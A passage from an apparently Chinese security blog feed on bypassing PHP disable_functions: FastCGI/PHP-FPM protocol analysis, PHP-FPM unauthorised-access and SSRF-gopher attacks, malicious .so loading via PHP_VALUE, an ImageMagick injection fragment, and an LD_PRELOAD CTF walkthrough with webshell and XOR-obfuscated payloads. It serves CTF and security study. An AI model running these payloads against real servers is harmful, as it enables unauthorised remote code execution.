class="hljs-string">&#x27;url(https://example.com/image.jpg&quot;|$command&quot;)&#x27;</span>pop graphic-contextEOF;file_put_contents(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>, $exploit);$thumb = <span class="hljs-keyword">new</span> Imagick();$thumb-&gt;readImage(<span class="hljs-string">&#x27;KKKK.mvg&#x27;</span>);$thumb-&gt;writeImage(<span class="hljs-string">&#x27;KKKK.png&#x27;</span>);$thumb-&gt;clear();$thumb-&gt;destroy();unlink(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>);unlink(<span class="hljs-string">&quot;KKKK.png&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>参考：<a href="https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable_functions/">https://whoamianony.top/2021/03/13/Web安全/Bypass Disable_functions/</a></p>]]></content>
    
    
    <categories>
      
      <category>bypass</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Bypass Disable Functions（二）—— Fastcgi 协议分析与 PHP-FPM 攻击方法</title>
    <link href="/2021/08/14/ff2/"/>
    <url>/2021/08/14/ff2/</url>
    
    <content type="html"><![CDATA[<h3 id="条件"><a class="header-anchor" href="#条件">🍭</a>条件</h3><p>Linux 操作系统 PHP-FPM 存在可写的目录，需要上传<code>.so</code>文件</p><h3 id="原理"><a class="header-anchor" href="#原理">🍭</a>原理</h3><h4 id="Fast-CGI"><a class="header-anchor" href="#Fast-CGI">🍭</a>Fast-CGI</h4><p>CGI解决了Web服务器与PHP解释器的通信问题，但是Web服务器每收到一个请求，都会去Fork一个CGI进程，请求结束再kill掉这个进程，很浪费资源。于是，便出现了CGI的改良版本——Fast-CGI。Fast-CGI每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求，提高效率。</p><h4 id="浏览器处理静态-动态网页过程"><a class="header-anchor" href="#浏览器处理静态-动态网页过程">🍭</a>浏览器处理静态/动态网页过程</h4><h5 id="静态"><a class="header-anchor" href="#静态">🍭</a>静态</h5><p><img src="/2021/08/14/ff2/1.png" alt="1"></p><h5 id="动态"><a class="header-anchor" href="#动态">🍭</a>动态</h5><p><img src="/2021/08/14/ff2/3.png" alt="3"></p><h4 id="Fast-CGI-Record"><a class="header-anchor" href="#Fast-CGI-Record">🍭</a>Fast-CGI Record</h4><p>HTTP协议是<strong>浏览器和服务器</strong>中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。类比HTTP，CGI协议是<strong>Web服务器和解释器</strong>进行数据交换的协议，它由多条record组成，每一条record都和HTTP一样，也由header和body组成，Web服务器将这二者按照CGI规则封装好发送给解释器，解释器解码之后拿到具体数据进行操作，得到结果之后再次封装好返回给Web服务器。</p><p>record的header头部固定的是8个字节，body是由头中的contentLength指定：</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><span class="hljs-class">&#123;</span><span class="hljs-comment">/*HEAD*/</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> version;              <span class="hljs-comment">//版本</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> type;                 <span class="hljs-comment">//类型</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> requestIdB1;          <span class="hljs-comment">//id</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> requestIdB0;              <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> contentLengthB1;      <span class="hljs-comment">//body大小</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> contentLengthB0;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> paddingLength;        <span class="hljs-comment">//额外大小</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> reserved;       <span class="hljs-comment">/*BODY*/</span>   <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> contentData[contentLength];<span class="hljs-comment">//主要内容</span>   <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> paddingData[paddingLength];<span class="hljs-comment">//额外内容</span>&#125;FCGI_Record;</code></pre><p>头由8个uchar类型的变量组成，每个变量1字节。其中，<code>requestId</code>占两个字节，一个唯一的标志id，以避免多个请求之间的影响；<code>contentLength</code>占两个字节，表示body的大小。body体就是语言端解析了fastcgi头以后，拿到<code>contentLength</code>后在TCP流里读取大小等于<code>contentLength</code>的数据。Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用。一个fastcgi record结构最大支持的body大小是<code>2^16</code>，65536字节。</p><h4 id="Fastcgi-Type"><a class="header-anchor" href="#Fastcgi-Type">🍭</a>Fastcgi Type</h4><p><code>type</code> 指定该 Record 的作用。Fastcgi 中一个 Record 的大小有限且作用单一，所以我们需要在一个TCP流里传输多个 Record，通过 <code>type</code> 来标志每个 Record 的作用，并用 <code>requestId</code> 来标识同一次请求的id。每次请求，会有多个 Record，<code>requestId</code> 是相同的。</p><p>主要的几种 <code>type</code>：</p><table><thead><tr><th style="text-align:center">type值</th><th style="text-align:left">具体含义</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:left">在与php-fpm建立连接之后发送的第一个消息中的type值就得为1，用来表明此消息为请求开始的第一个消息</td></tr><tr><td style="text-align:center">2</td><td style="text-align:left">异常断开与php-fpm的交互</td></tr><tr><td style="text-align:center">3</td><td style="text-align:left">在与php-fpm交互中所发的最后一个消息中type值为此，以表明交互的正常结束</td></tr><tr><td style="text-align:center">4</td><td style="text-align:left">在交互过程中给php-fpm传递环境变量时，将type设为此，以表明消息中包含的数据为某个name-value对</td></tr><tr><td style="text-align:center">5</td><td style="text-align:left">Web服务器将从浏览器接收到的POST请求数据（表单提交等）以消息的形式发给php-fpm，这种消息的type就得设为5</td></tr><tr><td style="text-align:center">6</td><td style="text-align:left">php-fpm给Web服务器回的正常响应消息的type就设为6</td></tr><tr><td style="text-align:center">7</td><td style="text-align:left">php-fpm给Web服务器回的错误响应设为7</td></tr></tbody></table><p>服务器中间件和后端语言通信，第一个数据包就是 <code>type</code> 为1的 Record，后续互相交流，发送 <code>type</code> 为4、5、6、7的 Record，结束时发送 <code>type</code> 为2、3的 Record。当后端语言接收到一个 <code>type</code> 为4的 Record 后，就会把这个 Record 的 Body 按照对应的结构解析成 key-value 对，规则如下：</p><ul><li>key、value均小于128字节，用 <code>FCGI_NameValuePair11</code></li><li>key大于128字节，value小于128字节，用 <code>FCGI_NameValuePair41</code></li><li>key小于128字节，value大于128字节，用 <code>FCGI_NameValuePair14</code></li><li>key、value均大于128字节，用 <code>FCGI_NameValuePair44</code></li></ul><h4 id="PHP-FPM"><a class="header-anchor" href="#PHP-FPM">🍭</a>PHP-FPM</h4><p>FPM是Fastcgi的协议解析器，Web服务器使用CGI协议封装好用户的请求发送给FPM。FPM按照CGI的协议将TCP流解析成真正的数据。</p><p>当用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>时，Nginx会将这个请求变成如下键值对：</p><pre><code class="hljs 1c">&#123;    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,    &#x27;REMOTE_PORT&#x27;: &#x27;<span class="hljs-number">1234</span>5&#x27;,    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,    &#x27;SERVER_NAME&#x27;: <span class="hljs-string">&quot;localhost&quot;</span>,    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;&#125;</code></pre><p>这个数组就是PHP中SERVER数组的一部分，也就是PHP里的环境变量。环境变量的作用不仅是填充_SERVER数组，也是告诉fpm要执行的PHP文件。PHP-FPM拿到Fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行<code>SCRIPT_FILENAME</code>的值指向的PHP文件，也就是<code>/var/www/html/index.php</code>。如果我们能够控制 <code>SCRIPT_FILENAME</code> 的值，就可以让 PHP-FPM 执行服务器上任意的 PHP 文件了。</p><h3 id="PHP-FPM-任意代码执行"><a class="header-anchor" href="#PHP-FPM-任意代码执行">🍭</a>PHP-FPM 任意代码执行</h3><p>Web 服务器中间件会将用户请求设置成环境变量，并且会出现一个 <code>'SCRIPT_FILENAME': '/var/www/html/index.php'</code> 这样的键值对，即使能够控制这个键值对的值，也只能控制 PHP-FPM 去执行某个已经存在的文件，不能够实现一些恶意代码的执行。并且在 PHP 5.3.9 后来的版本中，PHP 增加了 <code>security.limit_extensions</code> 安全选项，导致只能控制 PHP-FPM 执行一些像 php、php3、php4、php5、php7 这样的文件。但是 PHP 中有两个配置项：</p><ul><li><code>auto_prepend_file</code>：在执行目标文件之前，先包含 <code>auto_prepend_file</code> 中指定的文件。</li><li><code>auto_append_file</code>：在执行完成目标文件后，再包含 <code>auto_append_file</code> 指向的文件。</li></ul><p>假设我们设置 <code>auto_prepend_file</code> 为 <code>php://input</code>，就等于在执行任何 PHP 文件前都要包含一遍 POST 的内容。把需要执行的代码放在 Body 中就能被执行了（需要allow_url_include=on）</p><h5 id="设置-auto-prepend-file-的值"><a class="header-anchor" href="#设置-auto-prepend-file-的值">🍭</a>设置 <code>auto_prepend_file</code> 的值</h5><p>这就涉及到 PHP-FPM 的两个环境变量，<code>PHP_VALUE</code> 和 <code>PHP_ADMIN_VALUE</code>。<code>PHP_VALUE</code> 可以设置模式为 <code>PHP_INI_USER</code> 和 <code>PHP_INI_ALL</code> 的选项，<code>PHP_ADMIN_VALUE</code> 可以设置所有选项。</p><p>传入环境变量：</p><pre><code class="hljs 1c">&#123;    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,    &#x27;REMOTE_PORT&#x27;: &#x27;<span class="hljs-number">1234</span>5&#x27;,    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,    &#x27;SERVER_NAME&#x27;: <span class="hljs-string">&quot;localhost&quot;</span>,    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;&#125;</code></pre><h3 id="PHP-FPM-未授权访问漏洞"><a class="header-anchor" href="#PHP-FPM-未授权访问漏洞">🍭</a>PHP-FPM 未授权访问漏洞</h3><h5 id="原理-v2"><a class="header-anchor" href="#原理-v2">🍭</a>原理</h5><p>攻击者可以通过 <code>PHP_VALUE</code> 和 <code>PHP_ADMIN_VALUE</code> 这两个环境变量设置 PHP 配置选项 <code>auto_prepend_file</code> 和 <code>allow_url_include</code> ，从而使 PHP-FPM RCE。由于 PHP-FPM 和 Web  服务器中间件是通过网络进行沟通的，越来越多的集群将 PHP-FPM  直接绑定在公网上，所有人都可以对其进行访问。任何人都可以伪装成Web服务器中间件来让 PHP-FPM  执行我们想执行的恶意代码。</p><h5 id="条件-v2"><a class="header-anchor" href="#条件-v2">🍭</a>条件</h5><p>靶机：</p><p>设置监听9000端口来处理nginx的请求，并PHP-FPM 暴露在 0.0.0.0 。</p><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>php<span class="hljs-regexp">/7.4/</span>fpm<span class="hljs-regexp">/pool.d/</span>www.conf;listen = <span class="hljs-regexp">/run/</span>php/php7.<span class="hljs-number">4</span>-fpm.socklisten = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">9000</span></code></pre><p>nginx的配置文件 <code>/etc/nginx/sites-available/default</code> 下相应配置：</p><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;    <span class="hljs-attribute">listen</span>       <span class="hljs-number">80</span>; <span class="hljs-comment">#监听80端口，接收http请求</span>    <span class="hljs-attribute">server_name</span>  www.example.com; <span class="hljs-comment">#就是网站地址</span>    <span class="hljs-attribute">root</span> /var/www/html; <span class="hljs-comment"># 准备存放代码工程的路径</span>    <span class="hljs-comment">#路由到网站根目录www.example.com时候的处理</span>    <span class="hljs-attribute">location</span> / &#123;        <span class="hljs-attribute">index</span> index.php; <span class="hljs-comment">#跳转到www.example.com/index.php</span>        <span class="hljs-attribute">autoindex</span> <span class="hljs-literal">on</span>;    &#125;      <span class="hljs-comment">#当请求网站下php文件的时候，反向代理到php-fpm</span>    <span class="hljs-attribute">location</span> <span class="hljs-regexp">~ \.php$</span> &#123;        <span class="hljs-attribute">fastcgi_split_path_info</span><span class="hljs-regexp"> ^(.+\.php)(/.+)$</span>;        <span class="hljs-attribute">fastcgi_pass</span> <span class="hljs-number">0.0.0.0:9000</span>;<span class="hljs-comment">#nginx fastcgi进程监听的IP地址和端口</span>        <span class="hljs-comment">#fastcgi_pass unix:/run/php/php7.4-fpm.sock;</span>        <span class="hljs-attribute">fastcgi_index</span> index.php;        <span class="hljs-attribute">include</span> fastcgi_params;    &#125;&#125;</code></pre><h5 id="fcgi-exp-go-攻击"><a class="header-anchor" href="#fcgi-exp-go-攻击">🍭</a>fcgi_exp.go 攻击</h5><p>项目地址：<a href="https://github.com/wofeiwo/webcgi-exploits">https://github.com/wofeiwo/webcgi-exploits</a></p><p>直接运行可以看到 fcgi_exp 的使用方法：</p><p><img src="/2021/08/14/ff2/2.png" alt="2"></p><p>命令格式</p><pre><code class="hljs routeros">./fcgi_exp<span class="hljs-built_in"> system </span>192.168.22.82 9000 /var/www/html/index.php <span class="hljs-string">&quot;id&quot;</span></code></pre><ul><li>system：要使用的PHP函数</li><li>192.168.22.82：目标机IP</li><li>9000：目标机 fpm 端口</li><li>/var/www/html/index.php：已知的位于目标机上的PHP文件</li><li>id：要执行的系统命令</li></ul><h5 id="fpm-py攻击"><a class="header-anchor" href="#fpm-py攻击">🍭</a>fpm.py攻击</h5><p>项目地址：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p><p>利用方式</p><pre><code class="hljs php-template"><span class="xml">python fpm.py 192.168.43.82 /var/www/html/index.php -c &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&#x27;id&#x27;</span>); <span class="hljs-keyword">exit</span>(); <span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;</span></code></pre><h3 id="SSRF-中对-FPM-FastCGI-的攻击"><a class="header-anchor" href="#SSRF-中对-FPM-FastCGI-的攻击">🍭</a>SSRF 中对 FPM/FastCGI 的攻击</h3><p>当PHP-FPM 不绑定在 0.0.0.0 上面，而是 127.0.0.1，这样便避免了将 PHP-FPM 暴露在公网上被攻击者访问，但是如果目标主机上存在 SSRF 漏洞的话，我们便可以通过 SSRF 漏洞攻击内网的 PHP-FPM 。</p><p>举个例子：</p><p>当靶机存在 SSRF 漏洞的代码：</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>    highlight_file(<span class="hljs-keyword">__FILE__</span>);    $url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>];    $curl = curl_init($url);        <span class="hljs-comment">//第二种初始化curl的方式</span>    <span class="hljs-comment">//$curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $_GET[&#x27;url&#x27;]); </span>    <span class="hljs-comment">/*进行curl配置*/</span>    curl_setopt($curl, CURLOPT_HEADER, <span class="hljs-number">0</span>); <span class="hljs-comment">// 不输出HTTP头</span>    $responseText = curl_exec($curl);    <span class="hljs-keyword">echo</span> $responseText;    curl_close($curl);<span class="hljs-meta">?&gt;</span></code></pre><p>此时通过 SSRF 可以探测到目标主机上 9000 端口上运行的 php-fpm。虽然 php-fpm 没有暴露在公网上，但我们可以通过 SSRF 漏洞配合 Gopher 协议打内网的 php-fpm。</p><h4 id="利用-fcgi-exp-攻击"><a class="header-anchor" href="#利用-fcgi-exp-攻击">🍭</a>利用 fcgi_exp 攻击</h4><p>仍可以利用 上面讲到的fcgi_exp 攻击，但此时不能再用上面的payload，因为在配置端口监听的时候，仅允许监听在127.0.0.1，不存在 php-fpm 未授权访问。我们要通过 SSRF 来从目标机内部攻击 9000 端口：</p><p>使用 <code>nc -lvvp 1234 &gt; fcg_exp.txt</code> 监听1234 端口接收 payload：</p><p><img src="/2021/08/14/ff2/5.png" alt="5"></p><p>另外开启一个终端发送 payload：</p><pre><code class="hljs routeros">./fcgi_exp<span class="hljs-built_in"> system </span>127.0.0.1 1234 /var/www/html/index.php <span class="hljs-string">&quot;id&quot;</span></code></pre><p><img src="/2021/08/14/ff2/6.png" alt="6"></p><p>这里攻击的端口是前面监听的端口，目的是将payload发送到这个端口；得到了一个fcg_exp.txt的文件：</p><p><img src="/2021/08/14/ff2/7.png" alt="7"></p><p>有部分不可见字符，url编码：</p><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> urllib.parse import <span class="hljs-literal">quote</span>, unquote, urlencode<span class="hljs-built_in">file</span> = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;fcg_exp.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)payload = <span class="hljs-built_in">file</span>.<span class="hljs-built_in">read</span>()print(<span class="hljs-string">&quot;gopher://127.0.0.1:9000/_&quot;</span>+<span class="hljs-literal">quote</span>(payload).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D&quot;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;%2F&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>))</code></pre><p>执行后将payload进行二次url编码（GET进行一次解码，curl也会再进行一次解码）url传参即可RCE。</p><h4 id="利用-Gopherus-攻击"><a class="header-anchor" href="#利用-Gopherus-攻击">🍭</a>利用 Gopherus 攻击</h4><p>项目地址：<a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p><img src="/2021/08/14/ff2/4.png" alt="4"></p><p>工具需要的参数：</p><pre><code class="hljs awk">python gopherus.py --exploit fastcgi<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>ndex.php                 <span class="hljs-comment"># 这里输入的是一个已知存在的php文件</span>id                                      <span class="hljs-comment">#要获取的信息</span></code></pre><p><img src="/2021/08/14/ff2/8.png" alt="8"></p><h3 id="加载恶意-so绕过-Disable-Dunctions实现-RCE"><a class="header-anchor" href="#加载恶意-so绕过-Disable-Dunctions实现-RCE">🍭</a>加载恶意 .so绕过 Disable_Dunctions实现 RCE</h3><p>LD_PRELOAD 绕过 disable_functions 是把我们编译出来的恶意的 .so 文件加载到环境变量中去执行，实现RCE的，LD_PRELOAD 是通过 putenv() 把so文件加载到环境变量中再去调用。那么 Fastcgi 也可以做同样的事，只需要通过 <code>PHP_VALUE</code> 给 php.ini 添加一个 extender 扩展即可</p><pre><code class="hljs lsl">$php_value = <span class="hljs-string">&quot;unserialize_callback_func = system<span class="hljs-subst">\n</span>extension_dir = /tmp<span class="hljs-subst">\n</span>extension = hpdoger.so<span class="hljs-subst">\n</span>disable_classes = <span class="hljs-subst">\n</span>disable_functions = <span class="hljs-subst">\n</span>allow_url_include = On<span class="hljs-subst">\n</span>open_basedir = /<span class="hljs-subst">\n</span>auto_prepend_file = &quot;</span>;</code></pre><p>参考：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p><a href="https://whoamianony.top/2021/05/15/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA%20Fastcgi%20%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B8%8E%20PHP-FPM%20%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/">https://whoamianony.top/2021/05/15/Web安全/浅入深出 Fastcgi 协议分析与 PHP-FPM 攻击方法/</a></p>]]></content>
    
    
    <categories>
      
      <category>bypass</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Bypass Disable Function（一）</title>
    <link href="/2021/08/13/ff/"/>
    <url>/2021/08/13/ff/</url>
    
    <content type="html"><![CDATA[<h3 id="Disable-Functions"><a class="header-anchor" href="#Disable-Functions">🍭</a>Disable Functions</h3><p>平常的CTF中经常拿到webshell无法执行命令，原因：</p><ul><li>php.ini 中用 disable_functions 指示器禁用了 system()、exec() 等等这类命令执行的相关函数；</li><li>web 进程运行在 rbash 这类受限 shell 环境中；</li><li>WAF 拦劫。</li></ul><p>这时候就需要想办法绕过disable_functions。</p><p>常见危险函数：</p><ul><li>phpinfo() ：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。</li><li>passthru() ：允许执行一个外部程序并回显输出，类似于 exec()。</li><li>exec() ：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。</li><li>system() ：允许执行一个外部程序并回显输出，类似于 passthru()。</li><li>chroot() ：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式 PHP 时才能工作（不适用于 Windows 系统）。</li><li>scandir() ：列出指定路径中的文件和目录。</li><li>chgrp() ：改变文件或目录所属的用户组。</li><li>chown() ：改变文件或目录的所有者。</li><li>shell_exec() ：通过 Shell 执行命令，并将执行结果作为字符串返回。</li><li>proc_open() ：执行一个命令并打开文件指针用于读取以及写入。</li><li>proc_get_status() ：获取使用 proc_open() 所打开进程的信息。</li><li>error_log() ：将错误信息发送到指定位置（文件）。 安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode， 执行任意命令。</li><li>ini_alter() ：是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同。 具体参见 ini_set()。</li><li>ini_set() ：可用于修改、设置 PHP 环境配置参数。</li><li>ini_restore() ：可用于恢复 PHP 环境配置参数到其初始值。</li><li>dl() ：在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。</li><li>pfsockopen() ：建立一个 Internet 或 UNIX 域的 socket 持久连接。</li><li>syslog() ：可调用 UNIX 系统的系统层 syslog() 函数。</li><li>readlink() ：返回符号连接指向的目标文件内容。</li><li>symlink() ：在 UNIX 系统中建立一个符号链接。</li><li>popen() ：可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。</li><li>stream_socket_server() ：建立一个 Internet 或 UNIX 服务器连接。</li><li>putenv() ：用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数 修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。</li></ul><h3 id="绕过方式"><a class="header-anchor" href="#绕过方式">🍭</a>绕过方式</h3><ul><li>第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash  的破壳漏洞；</li><li>第二种，寻找未禁用的漏网函数，常见的执行命令的函数有  system()、exec()、shell_exec()、passthru()，偏僻的     popen()、proc_open()、pcntl_exec()，逐一尝试；</li><li>第三种，mod_cgi 模式，尝试修改  .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；</li><li>第四种，利用环境变量 LD_PRELOAD  劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果</li></ul><h3 id="利用-LD-PRELOAD-环境变量"><a class="header-anchor" href="#利用-LD-PRELOAD-环境变量">🍭</a>利用 LD_PRELOAD 环境变量</h3><h4 id="原理"><a class="header-anchor" href="#原理">🍭</a>原理</h4><p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），允许定义在程序运行前优先加载的动态链接库。主要用来有选择性的载入不同动态链接库中的相同函数。我们可以通过它在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的攻击目的。通过环境变量 LD_PRELOAD 劫持系统函数，可以达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</p><h4 id="条件"><a class="header-anchor" href="#条件">🍭</a>条件</h4><ul><li>能上传自己的.so文件</li><li>能够控制LD_PRELOAD环境变量的值，比如putenv()函数 因为新进程启动将加载LD_PRELOAD中的.so文件，所以要存在可以控制PHP启动外部程序的函数并能执行，比如mail()、imap_mail()、mb_send_mail()和error_log()函数等</li></ul><h4 id="思路"><a class="header-anchor" href="#思路">🍭</a>思路</h4><p>利用漏洞控制 web 启动新进程 a.bin，a.bin 内部调用系统函数 b()，b()  位于系统共享对象 <a href="http://c.so">c.so</a>  中，所以系统为该进程加载共 <a href="http://c.so">c.so</a>，想法在 <a href="http://c.so">c.so</a> 前优先加载可控的 c_evil.so，c_evil.so  内含与 b()  同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的  <a href="http://c.so">c.so</a> 内  b()，同时，c_evil.so 可控，达到执行恶意代码的目的。</p><h4 id="流程"><a class="header-anchor" href="#流程">🍭</a>流程</h4><ul><li>编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 getuid_shadow.so；</li><li>运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为  getuid_shadow.so，以便后续启动新进程时优先加载该共享对象；</li><li>运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步   LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 getuid_shadow.so 中的同名   getuid() 所劫持；</li><li>达到不调用 PHP 的各种命令执行函数达到执行系统命令的目的。</li></ul><h4 id="阻碍"><a class="header-anchor" href="#阻碍">🍭</a>阻碍</h4><ul><li>某些环境中，web 禁止启用 sendmail、甚至系统上根本未安装 sendmail，通常的 www-data 权限不能更改 php.ini 配置、安装 sendmail 软件；</li><li>即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 无法将主机名加入 hosts</li></ul><h4 id="利用：-极客大挑战-2019-RCE-ME"><a class="header-anchor" href="#利用：-极客大挑战-2019-RCE-ME">🍭</a>利用：[极客大挑战 2019]RCE ME</h4><p>无字母shell后发现禁了一堆函数</p><p><img src="/2021/08/13/ff/2.png" alt="2"></p><p>构造shell连上蚁剑后无法执行命令：</p><p><img src="/2021/08/13/ff/3.png" alt="3"></p><p>需要利用如下几个文件：</p><p><img src="/2021/08/13/ff/4.png" alt="4"></p><ul><li><p>bypass_disablefunc.php：一个用来执行命令的 webshell。</p><p>上传到web目录的直接访问，无权限的话可以传到tmp目录后用include等函数来包含，并且需要用 GET 方法提供三个参数：</p><ul><li>cmd 参数：待执行的系统命令，如 id 命令。</li><li>outpath 参数：保存命令执行输出结果的文件路径（如 /tmp/xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点。</li><li>sopath 参数：指定劫持系统函数的共享对象的绝对路径（如 /var/www/bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。</li></ul></li><li><p>bypass_disablefunc_x64.so或bypass_disablefunc_x86.so：执行命令的共享对象文件，分为64位的和32位的。</p></li><li><p>bypass_disablefunc.c：用来编译生成上面的共享对象文件。</p></li></ul><p>将 bypass_disablefunc.php 和 bypass_disablefunc_x64.so 传到目标有权限的目录中</p><p><img src="/2021/08/13/ff/5.png" alt="5"></p><p>然后将bypass_disablefunc.php包含进来并使用GET方法提供所需的参数：</p><pre><code class="hljs markdown">?code=$&#123;<span class="hljs-emphasis">_GET&#125;[<span class="hljs-string">_</span>](<span class="hljs-link">$&#123;_GET&#125;[_]</span>);&amp;_</span>=assert&amp;<span class="hljs-strong">__=include(%27/var/tmp/bypass<span class="hljs-emphasis">_disablefunc.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_</span>disablefunc<span class="hljs-emphasis">_x64.so</span></span></code></pre><p>异或构造</p><pre><code class="hljs sas">?code=$&#123;<span class="hljs-name">%fe</span><span class="hljs-name">%fe</span><span class="hljs-name">%fe</span><span class="hljs-name">%fe</span>^<span class="hljs-name">%a1</span><span class="hljs-name">%b9</span><span class="hljs-name">%bb</span><span class="hljs-name">%aa</span>&#125;[_]($&#123;<span 